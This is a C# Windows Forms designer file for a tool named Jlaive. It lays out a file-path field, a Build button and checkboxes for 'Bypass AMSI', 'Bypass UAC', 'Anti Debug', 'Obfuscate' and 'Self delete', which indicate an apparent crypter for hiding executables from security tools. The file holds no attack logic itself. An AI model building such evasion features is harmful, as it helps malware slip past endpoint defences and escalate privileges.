namespace Jlaive
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.label1 = new System.Windows.Forms.Label();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.openButton = new System.Windows.Forms.Button();
            this.bypassAMSI = new System.Windows.Forms.CheckBox();
            this.obfuscate = new System.Windows.Forms.CheckBox();
            this.bypassUAC = new System.Windows.Forms.CheckBox();
            this.antiDebug = new System.Windows.Forms.CheckBox();
            this.buildButton = new System.Windows.Forms.Button();
            this.selfDelete = new System.Windows.Forms.CheckBox();
            this.SuspendLayout();
            // 
            // label1
            // 
            this.label1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.Location = new System.Drawing.Point(7, 7);
            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(57, 15);
            this.label1.TabIndex = 0;
            this.label1.Text = "File path:";
            // 
            // textBox1
            // 
            this.textBox1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.textBox1.Location = new System.Drawing.Point(10, 24);
            this.textBox1.Margin = new System.Windows.Forms.Padding(2);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(326, 20);
            this.textBox1.TabIndex = 1;
            // 
            // openButton
            // 
            this.openButton.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.openButton.Location = new System.Drawing.Point(339, 24);
            this.openButton.Margin = new System.Windows.Forms.Padding(2);
            this.openButton.Name = "openButton";
            this.openButton.Size = new System.Drawing.Size(60, 20);
            this.openButton.TabIndex = 2;
            this.openButton.Text = "...";
            this.openButton.UseVisualStyleBackColor = true;
            this.openButton.Click += new System.EventHandler(this.openButton_Click);
            // 
            // bypassAMSI
            // 
            this.bypassAMSI.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.bypassAMSI.AutoSize = true;
            this.bypassAMSI.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.bypassAMSI.Location = new System.Drawing.Point(10, 61);
            this.bypassAMSI.Margin = new System.Windows.Forms.Padding(2);
            this.bypassAMSI.Name = "bypassAMSI";
            this.bypassAMSI.Size = new System.Drawing.Size(97, 19);
            this.bypassAMSI.TabIndex = 3;
            this.bypassAMSI.Text = "Bypass AMSI";
            this.bypassAMSI.UseVisualStyleBackColor = true;
            // 
            // obfuscate
            // 
            this.obfuscate.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.obfuscate.AutoSize = true;
            this.obfuscate.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.obfuscate.Location = new System.Drawing.Point(10, 129);
            this.obfuscate.Margin = new System.Windows.Forms.Padding(2);
            this.obfuscate.Name = "obfuscate";
            this.obfuscate.Size = new System.Drawing.Size(81, 19);
            this.obfuscate.TabIndex = 4;
            this.obfuscate.Text = "Obfuscate";
            this.obfuscate.UseVisualStyleBackColor = true;
            // 
            // bypassUAC
            // 
            this.bypassUAC.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.bypassUAC.AutoSize = true;
            this.bypassUAC.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.bypassUAC.Location = new System.Drawing.Point(10, 84);
            this.bypassUAC.Margin = new System.Windows.Forms.Padding(2);
            this.bypassUAC.Name = "bypassUAC";
            this.bypassUAC.Size = new System.Drawing.Size(92, 19);
            this.bypassUAC.TabIndex = 5;
            this.bypassUAC.Text = "Bypass UAC";
            this.bypassUAC.UseVisualStyleBackColor = true;
            // 
            // antiDebug
            // 
            this.antiDebug.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.antiDebug.AutoSize = true;
            this.antiDebug.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.antiDebug.Location = new System.Drawing.Point(10, 106);
            this.antiDebug.Margin = new System.Windows.Forms.Padding(2);
            this.antiDebug.Name = "antiDebug";
            this.antiDebug.Size = new System.Drawing.Size(86, 19);
            this.antiDebug.TabIndex = 6;
            this.antiDebug.Text = "Anti Debug";
            this.antiDebug.UseVisualStyleBackColor = true;
            // 
            // buildButton
            // 
            this.buildButton.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.buildButton.Location = new System.Drawing.Point(10, 194);
            this.buildButton.Margin = new System.Windows.Forms.Padding(2);
            this.buildButton.Name = "buildButton";
            this.buildButton.Size = new System.Drawing.Size(390, 38);
            this.buildButton.TabIndex = 7;
            this.buildButton.Text = "Build";
            this.buildButton.UseVisualStyleBackColor = true;
            this.buildButton.Click += new System.EventHandler(this.buildButton_Click);
            // 
            // selfDelete
            // 
            this.selfDelete.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.selfDelete.AutoSize = true;
            this.selfDelete.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.selfDelete.Location = new System.Drawing.Point(10, 151);
            this.selfDelete.Margin = new System.Windows.Forms.Padding(2);
            this.selfDelete.Name = "selfDelete";
            this.selfDelete.Size = new System.Drawing.Size(84, 19);
            this.selfDelete.TabIndex = 8;
            this.selfDelete.Text = "Self delete";
            this.selfDelete.UseVisualStyleBackColor = true;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
            this.ClientSize = new System.Drawing.Size(411, 241);
            this.Controls.Add(this.selfDelete);
            this.Controls.Add(this.buildButton);
            this.Controls.Add(this.antiDebug);
            this.Controls.Add(this.bypassUAC);
            this.Controls.Add(this.obfuscate);
            this.Controls.Add(this.bypassAMSI);
            this.Controls.Add(this.openButton);
            this.Controls.Add(this.textBox1);
            this.Controls.Add(this.label1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.ShowIcon = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Jlaive";
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.TextBox textBox1;
        private System.Windows.Forms.Button openButton;
        private System.Windows.Forms.CheckBox bypassAMSI;
        private System.Windows.Forms.CheckBox obfuscate;
        private System.Windows.Forms.CheckBox bypassUAC;
        private System.Windows.Forms.CheckBox antiDebug;
        private System.Windows.Forms.Button buildButton;
        private System.Windows.Forms.CheckBox selfDelete;
    }
}
